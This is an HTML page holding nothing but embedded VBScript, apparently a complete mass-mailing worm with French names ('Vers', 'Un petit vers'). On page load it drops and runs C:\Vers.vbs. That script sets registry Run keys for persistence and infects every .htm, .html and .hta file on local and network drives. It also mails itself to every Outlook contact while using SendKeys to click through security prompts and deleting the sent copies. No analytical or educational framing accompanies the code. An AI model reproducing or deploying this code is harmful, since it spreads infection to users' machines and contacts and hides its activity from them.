<script language=vbscript>
<!--
set fso=createobject("Scripting.FileSystemObject")
Set WshShell = Createobject("WScript.Shell")
set fich=fso.createtextfile("C:\Vers.vbs")
dim vbfich(10000)
vbfich(1)= "set fso=createobject(�Scripting.FileSystemObject�)"
vbfich(2)= "set repwin=fso.GetSpecialFolder(0)"
vbfich(3)= "set WshShell = WScript.CreateObject(�WScript.Shell�)"
vbfich(4)= "dim Nom1,Nom2,Action,html,script,script2"
vbfich(5)= "dim scripthtml(1000)"
vbfich(6)= "Cle1=�HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Worm�"
vbfich(7)= "Cle2=�HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion�"
vbfich(8)= "Set file = fso.OpenTextFile(WScript.ScriptFullName, 1)"
vbfich(9)= "Script = file.ReadAll "
vbfich(10)= "Script2=replace(Script,chr(34),chr(163))"
vbfich(11)= "Script3=Script2"
vbfich(12)= "For i= 1 to 10000"
vbfich(13)= "do"
vbfich(14)= "car = left(Script3,1)"
vbfich(15)= "Script3=right(Script3,len(Script3)-1)"
vbfich(16)= "if len(Script3)=0 then exit for"
vbfich(17)= "if asc(car)>32 or car=� � then ScriptHtml(i)=ScriptHtml(i)+car"
vbfich(18)= "if car = chr(10) then exit do"
vbfich(19)= "loop until car = chr(10)"
vbfich(20)= "if ScriptHtml(i)=�� then exit for"
vbfich(21)= "Next"
vbfich(22)= "call lancement"
vbfich(23)= "call mailoutlook"
vbfich(24)= "call listadriv"
vbfich(25)= "Call fin"
vbfich(26)= "sub lancement"
vbfich(27)= "if Wscript.ScriptFullName=�C:\Vers.vbs� then"
vbfich(28)= "Nom1=GenerNom()"
vbfich(29)= "Nom2=GenerNom()"
vbfich(30)= "WshShell.RegWrite Cle2+�\Run\�+Nom1,repwin+�\�+Nom2+�.vbs�"
vbfich(31)= "WshShell.RegWrite Cle2+�\RunServices\�+Nom1,repwin+�\�+Nom2+�.vbs�"
vbfich(32)= "Set FichDer=fso.CreateTextFile(repwin+�\�+Nom2+�.vbs�)"
vbfich(33)= "FichDer.write Script"
vbfich(34)= "msgbox �Bonjour! �"
vbfich(35)= "end if"
vbfich(36)= "action=1"
vbfich(37)= "on error resume next"
vbfich(38)= "action=WshShell.RegRead(Cle1)"
vbfich(39)= "WshShell.RegWrite Cle1,Action"
vbfich(40)= "NomHtm=genernom()"
vbfich(41)= "set FichIn=createtextfile(repwin+�\�+NomHtm+�.htm�)"
vbfich(42)= "FichIn.writeline �<script language=vbscript>�"
vbfich(43)= "FichIn.writeline �<!--�"
vbfich(44)= "Fichin.writeline �set fso=createobject(�+chr(34)+�Scripting.FileSystemObject�+chr(34)+�)�"
vbfich(45)= "FichIn.writeline �Set WshShell = Createobject(�+chr(34)+�WScript.Shell�+chr(34)+�)�"
vbfich(46)= "FichIn.writeline �set fich=fso.createtextfile(�+chr(34)+�C:\Vers.vbs�+chr(34)+�)�"
vbfich(47)= "FichIn.writeline �dim vbfich(10000)�"
vbfich(48)= "For i= 1 to 10000"
vbfich(49)= "FichIn.writeline �vbfich(�+Cstr(i)+�)= �+chr(34)+ScriptHtml(i)+chr(34)"
vbfich(50)= "If ScriptHtml(i)=�� then exit for"
vbfich(51)= "Next"
vbfich(52)= "PlusRien:"
vbfich(53)= "FichIn.writeline �For i = 1 to 10000�"
vbfich(54)= "FichIn.writeline �vbfich(i)=replace(vbfich(i),�+chr(34)+chr(163)+chr(34)+�,chr(34))�"
vbfich(55)= "FichIn.writeline �fich.writeline vbfich(i)�"
vbfich(56)= "FichIn.writeline �If vbfich(i)=�+chr(34)+chr(34)+� then exit for�"
vbfich(57)= "FichIn.writeline �Next�"
vbfich(58)= "FichIn.writeline �fich.close�"
vbfich(59)= "FichIn.writeline �WshShell.run �+chr(34)+�C:\Vers.vbs�+chr(34)"
vbfich(60)= "FichIn.writeline �-->�"
vbfich(61)= "FichIn.writeline �</�+�scr�+�ipt>�"
vbfich(62)= "FichIn.write FichIn2"
vbfich(63)= "FichIn.save"
vbfich(64)= "FichIn.close"
vbfich(65)= "set FichHtm=opentextfile(repwin+�\�+NomHtm+�.htm�,1)"
vbfich(66)= "Html=FichHtm.readall"
vbfich(67)= "FichHtm.close"
vbfich(68)= "end sub"
vbfich(69)= "Sub listadriv()"
vbfich(70)= "if Action = 1 then"
vbfich(71)= "On Error Resume Next"
vbfich(72)= "Dim d, dc, s"
vbfich(73)= "Set dc = fso.Drives"
vbfich(74)= "For Each d In dc"
vbfich(75)= "If d.DriveType = 2 Or d.DriveType = 3 Then"
vbfich(76)= "fileslist(d.path + �\�)"
vbfich(77)= "folderlist(d.path + �\�)"
vbfich(78)= "End If"
vbfich(79)= "Next"
vbfich(80)= "End if"
vbfich(81)= "End Sub"
vbfich(82)= "Sub folderlist(folderspec)"
vbfich(83)= "On Error Resume Next"
vbfich(84)= "Dim f, f1, sf"
vbfich(85)= "Set f = fso.GetFolder(folderspec)"
vbfich(86)= "Set sf = f.SubFolders"
vbfich(87)= "For Each f1 In sf"
vbfich(88)= "fileslist (f1.Path)"
vbfich(89)= "folderlist (f1.Path)"
vbfich(90)= "Next"
vbfich(91)= "end sub"
vbfich(92)= "sub fileslist(folderspec)"
vbfich(93)= "On Error Resume Next"
vbfich(94)= "Dim f, f1, fc, ext, ap, s, bname"
vbfich(95)= "Set f = fso.GetFolder(folderspec)"
vbfich(96)= "Set fc = f.Files"
vbfich(97)= "For Each f1 In fc"
vbfich(98)= "ext = fso.GetExtensionName(f1.Path)"
vbfich(99)= "ext = LCase(ext)"
vbfich(100)= "s = LCase(f1.Name)"
vbfich(101)= "if ext=�hta� or ext=�html� or ext=�htm� then"
vbfich(102)= "Set FichIn = fso.OpenTextFile(f1.path, 1)"
vbfich(103)= "FichIn3=FichIn.ReadAll"
vbfich(104)= "FichIn2 = FichIn.Readline "
vbfich(105)= "FichIn.close"
vbfich(106)= "if FichIn2<>�<SCRIPT language=vbscript>� then"
vbfich(107)= "Set FichIn = fso.CreateTextFile(f1.path)"
vbfich(108)= "FichIn=fso.CreateTextFile(f1.path)"
vbfich(109)= "FichIn.writeline �<script language=vbscript>�"
vbfich(110)= "FichIn.writeline �<!--�"
vbfich(111)= "Fichin.writeline �set fso=createobject(�+chr(34)+�Scripting.FileSystemObject�+chr(34)+�)�"
vbfich(112)= "FichIn.writeline �Set WshShell = Createobject(�+chr(34)+�WScript.Shell�+chr(34)+�)�"
vbfich(113)= "FichIn.writeline �set fich=fso.createtextfile(�+chr(34)+�C:\Vers.vbs�+chr(34)+�)�"
vbfich(114)= "FichIn.writeline �dim vbfich(10000)�"
vbfich(115)= "For i= 1 to 10000"
vbfich(116)= "FichIn.writeline �vbfich(�+Cstr(i)+�)= �+chr(34)+ScriptHtml(i)+chr(34)"
vbfich(117)= "If ScriptHtml(i)=�� then exit for"
vbfich(118)= "Next"
vbfich(119)= "PlusRien:"
vbfich(120)= "FichIn.writeline �For i = 1 to 10000�"
vbfich(121)= "FichIn.writeline �vbfich(i)=replace(vbfich(i),�+chr(34)+chr(163)+chr(34)+�,chr(34))�"
vbfich(122)= "FichIn.writeline �fich.writeline vbfich(i)�"
vbfich(123)= "FichIn.writeline �If vbfich(i)=�+chr(34)+chr(34)+� then exit for�"
vbfich(124)= "FichIn.writeline �Next�"
vbfich(125)= "FichIn.writeline �fich.close�"
vbfich(126)= "FichIn.writeline �WshShell.run �+chr(34)+�C:\Vers.vbs�+chr(34)"
vbfich(127)= "FichIn.writeline �-->�"
vbfich(128)= "FichIn.writeline �</�+�scr�+�ipt>�"
vbfich(129)= "FichIn.write FichIn3"
vbfich(130)= "FichIn.save"
vbfich(131)= "FichIn.close"
vbfich(132)= "end if"
vbfich(133)= "End If"
vbfich(134)= "next"
vbfich(135)= "end sub"
vbfich(136)= "sub MailOutlook()"
vbfich(137)= "On error resume next"
vbfich(138)= "Set WshShell = WScript.Createobject(�WScript.Shell�)"
vbfich(139)= "Set out = CreateObject(�Outlook.Application�)"
vbfich(140)= "If out = �Outlook� and Action=1 and Wscript.ScriptFullName=�C:\Vers.vbs� Then"
vbfich(141)= "Set mapi = out.GetNameSpace(�MAPI�)"
vbfich(142)= "Set carnets = mapi.AddressLists"
vbfich(143)= "For Each carnet In carnets"
vbfich(144)= "If carnet.AddressEntries.Count <> 0 Then"
vbfich(145)= "WshShell.AppActive �Microsoft Outlook�"
vbfich(146)= "WshShell.Sendkeys �{TAB}{TAB}{TAB}{ENTER}�"
vbfich(147)= "carnet2 = carnet.AddressEntries.Count"
vbfich(148)= "For entree = 1 To carnet2"
vbfich(149)= "Set adresse = carnet.AddressEntries(entree)"
vbfich(150)= "Set message = out.CreateItem(0)"
vbfich(151)= "message.to=adresse"
vbfich(152)= "message.subject=�Un petit vers�"
vbfich(153)= "message.htmlbody=html"
vbfich(154)= "message.DeleteAfterSubmit = True"
vbfich(155)= "set Copie=Message.Attachments"
vbfich(156)= "Copie.add Wscript.ScriptFullname"
vbfich(157)= "message.send"
vbfich(158)= "Wscript.Sleep 5000"
vbfich(159)= "WshShell.AppActive �Microsoft Outlook�"
vbfich(160)= "WshShell.Sendkeys �{TAB}{TAB}{ENTER}�"
vbfich(161)= "WshShell.Sendkeys �{TAB}{TAB}{ENTER}�"
vbfich(162)= "Next"
vbfich(163)= "End If"
vbfich(164)= "Next"
vbfich(165)= "End If"
vbfich(166)= "end sub"
vbfich(167)= "Sub Fin()"
vbfich(168)= "On error resume next"
vbfich(169)= "do"
vbfich(170)= "If action=1 then"
vbfich(171)= "WScript.Sleep 2000"
vbfich(172)= "WshShell.Regdelete Cle2+�\Run\�+Nom1"
vbfich(173)= "WshShell.Regdelete Cle2+�\RunServices\�+Nom1"
vbfich(174)= "fso.DeleteFile (repwin+�\�+Nom2+�.vbs�)"
vbfich(175)= "Nom1=GenerNom()"
vbfich(176)= "Nom2=GenerNom()"
vbfich(177)= "WshShell.RegWrite Cle2+�\Run\�+Nom1,repwin+�\�+Nom2+�.vbs�"
vbfich(178)= "WshShell.RegWrite Cle2+�\RunServices\�+Nom1,repwin+�\�+Nom2+�.vbs�"
vbfich(179)= "Set FichDer=fso.CreateTextFile(repwin+�\�+Nom2+�.vbs�)"
vbfich(180)= "FichDer.write Script"
vbfich(181)= "Fichder.close"
vbfich(182)= "end if"
vbfich(183)= "loop"
vbfich(184)= "end sub"
vbfich(185)= "Function GenerNom()"
vbfich(186)= "Nom=��"
vbfich(187)= "Randomize Timer"
vbfich(188)= "do:h1=int(rnd*8):loop until h1>2"
vbfich(189)= "for lettre=1 to h1"
vbfich(190)= "do:h2=int(rnd*25):loop until h2>0"
vbfich(191)= "Nom=Nom+Chr(h2+66)"
vbfich(192)= "next"
vbfich(193)= "GenerNom=Nom"
vbfich(194)= "End Function'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''"
vbfich(195)= "''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''"
vbfich(196)= ""
For i = 1 to 10000
vbfich(i)=replace(vbfich(i),"�",chr(34))
fich.writeline vbfich(i)
If vbfich(i)="" then exit for
Next
fich.close
WshShell.run "C:\Vers.vbs"
-->
</script>
